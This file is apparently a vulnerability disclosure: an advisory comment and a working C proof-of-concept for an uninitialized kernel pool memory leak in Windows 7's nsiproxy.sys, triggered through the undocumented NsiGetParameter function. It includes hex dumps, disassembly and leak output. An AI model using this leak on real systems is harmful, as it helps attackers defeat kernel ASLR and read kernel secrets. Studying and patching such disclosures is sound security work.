@@ -1,0 +1,191 @@
+/*
+We have discovered that the handler of the 0x120007 IOCTL in nsiproxy.sys (\\.\Nsi device) discloses portions of uninitialized pool memory to user-mode clients, likely due to output structure alignment holes.
+
+On our test Windows 7 32-bit workstation, an example layout of the output buffer is as follows:
+
+--- cut ---
+00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 ff ff ff ................
+00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000090: 00 00 00 00 00 00 00 00 00 ff ff ff 00 00 00 00 ................
+000000a0: 00 00 00 00 ff 00 ff ff 00 00 00 00 ff ff ff ff ................
+000000b0: 00 00 00 00 00 00 00 00                         ........
+--- cut ---
+
+Where 00 denote bytes which are properly initialized, while ff indicate uninitialized values copied back to user-mode. As can be seen, a total of 13 bytes (out of 184) scattered across the structure are disclosed to the client application. The bug manifests itself through a call to the undocumented NSI!NsiGetParameter userland function, in the same fashion that it is called in WSDApi!CWSDInterfaceTable::GetInterfaceProfiles:
+
+--- cut ---
+.text:6EA52AFF                 push    eax
+.text:6EA52B00                 push    ebx
+.text:6EA52B01                 lea     eax, [ebp+var_BC]
+.text:6EA52B07                 push    eax
+.text:6EA52B08                 push    0
+.text:6EA52B0A                 push    8
+.text:6EA52B0C                 lea     eax, [ebp+InterfaceLuid]
+.text:6EA52B12                 push    eax
+.text:6EA52B13                 push    7
+.text:6EA52B15                 push    offset _NPI_MS_IPV4_MODULEID
+.text:6EA52B1A                 push    1
+.text:6EA52B1C                 call    _NsiGetParameter@36 ; NsiGetParameter(x,x,x,x,x,x,x,x,x)
+--- cut ---
+
+The issue can be reproduced by running the attached proof-of-concept program on a system with the Special Pools mechanism enabled for netio.sys. Then, it is clearly visible that bytes at the aforementioned offsets are equal to the markers inserted by Special Pools (0x3d or '=' in this case), and would otherwise contain leftover data that was previously stored in that memory region:
+
+--- cut ---
+Number of Adapters: 1
+
+Adapter Index[0]: 11
+00000000: 00 00 00 00 00 01 01 00 00 00 01 01 00[3d 3d 3d].............===
+00000010: 00 00 00 00 02 00 00 00 00 00 00 00 0a 00 00 00 ................
+00000020: 30 75 00 00 e8 03 00 00 c0 27 09 00 03 00 00 00 0u.......'......
+00000030: 01 00 00 00 64 19 00 00 0b 00 00 00 0b 00 00 00 ....d...........
+00000040: 0b 00 00 00 0b 00 00 00 01 00 00 00 01 00 00 00 ................
+00000050: 01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 ................
+00000060: 01 00 00 00 01 00 00 00 01 00 00 00 01 00 00 00 ................
+00000070: 00 00 00 00 01 00 00 00 dc 05 00 00 40 00 00 00 ............@...
+00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
+00000090: 00 00 00 00 00 00 00 00 00[3d 3d 3d]08 07 00 00 .........===....
+000000a0: 01 00 00 00[3d]00[3d 3d]00 00 00 00[3d 3d 3d 3d]....=.==....====
+000000b0: 6b 0a 34 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? k.4.............
+--- cut ---
+
+At least one local network adapter must be installed on the tested machine to observe the bug. The PoC source code is based on the code sample from https://msdn.microsoft.com/en-us/library/windows/desktop/aa365947(v=vs.85).aspx (in order to list network interfaces) and http://www.nynaeve.net/Code/GetInterfaceMetric.cpp (in order to resolve and call NSI!NsiGetParameter).
+
+Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+// Based on example code from https://msdn.microsoft.com/en-us/library/windows/desktop/aa365947(v=vs.85).aspx
+// and http://www.nynaeve.net/Code/GetInterfaceMetric.cpp.
+
+#include <winsock2.h>
+#include <ws2ipdef.h>
+#include <iphlpapi.h>
+#include <stdio.h>
+#include <objbase.h>
+
+#pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "Ole32.lib")
+
+#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x)) 
+#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))
+
+/* Note: could also use malloc() and free() */
+
+//
+// Suspected prototype of NsiGetParameter, via reverse engineering.
+//
+
+typedef DWORD (__stdcall *NsiGetParameterProc)(
+  DWORD        Argument1,
+  CONST UCHAR* Argument2,
+  DWORD        Argument3,
+  PNET_LUID    Argument4,
+  DWORD        Argument5,
+  DWORD        Argument6,
+  PUCHAR       Argument7,
+  DWORD        Argument8,
+  DWORD        Argument9
+  );
+
+/*
+0:000> db NPI_MS_IPV4_MODULEID l14
+751b3364  18 00 00 00 01 00 00 00-00 4a 00 eb 1a 9b d4 11
+751b3374  91 23 00 50 04 77 59 BC
+*/
+
+const unsigned char NPI_MS_IPV4_MODULEID[0x18] =
+{
+  0x18, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x4A, 0x00, 0xEB, 0x1A, 0x9B, 0xD4, 0x11,
+  0x91, 0x23, 0x00, 0x50, 0x04, 0x77, 0x59, 0xBC
+};
+
+VOID PrintHex(PBYTE Data, ULONG dwBytes) {
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+int main() {
+  HMODULE hNsi = LoadLibraryW(L"Nsi.dll");
+  NsiGetParameterProc _NsiGetParameter = (NsiGetParameterProc)GetProcAddress(hNsi, "NsiGetParameter");
+
+  // Declare and initialize variables
+  PIP_INTERFACE_INFO pInfo = NULL;
+  ULONG ulOutBufLen = 0;
+
+  DWORD dwRetVal = 0;
+  int iReturn = 1;
+
+  int i;
+
+  // Make an initial call to GetInterfaceInfo to get
+  // the necessary size in the ulOutBufLen variable
+  dwRetVal = GetInterfaceInfo(NULL, &ulOutBufLen);
+  if (dwRetVal == ERROR_INSUFFICIENT_BUFFER) {
+    pInfo = (IP_INTERFACE_INFO *)MALLOC(ulOutBufLen);
+    if (pInfo == NULL) {
+      printf
+        ("Unable to allocate memory needed to call GetInterfaceInfo\n");
+      return 1;
+    }
+  }
+  // Make a second call to GetInterfaceInfo to get
+  // the actual data we need
+  dwRetVal = GetInterfaceInfo(pInfo, &ulOutBufLen);
+  if (dwRetVal == NO_ERROR) {
+    printf("Number of Adapters: %ld\n\n", pInfo->NumAdapters);
+    for (i = 0; i < pInfo->NumAdapters; i++) {
+      printf("Adapter Index[%d]: %ld\n", i,
+        pInfo->Adapter[i].Index);
+
+      NET_LUID Luid;
+      NETIO_STATUS st = ConvertInterfaceIndexToLuid(pInfo->Adapter[i].Index, &Luid);
+      if (st == NO_ERROR) {
+        BYTE OutputBuffer[0xB8] = { /* zero padding */ };
+        DWORD nsi_st = _NsiGetParameter(1, NPI_MS_IPV4_MODULEID, 7, &Luid, sizeof(Luid), 0, OutputBuffer, sizeof(OutputBuffer), 0);
+        if (nsi_st == NO_ERROR) {
+          PrintHex(OutputBuffer, sizeof(OutputBuffer));
+        }
+      }
+    }
+    iReturn = 0;
+  }
+  else if (dwRetVal == ERROR_NO_DATA) {
+    printf
+      ("There are no network adapters with IPv4 enabled on the local system\n");
+    iReturn = 0;
+  }
+  else {
+    printf("GetInterfaceInfo failed with error: %d\n", dwRetVal);
+    iReturn = 1;
+  }
+
+  FREE(pInfo);
+  return (iReturn);
+}
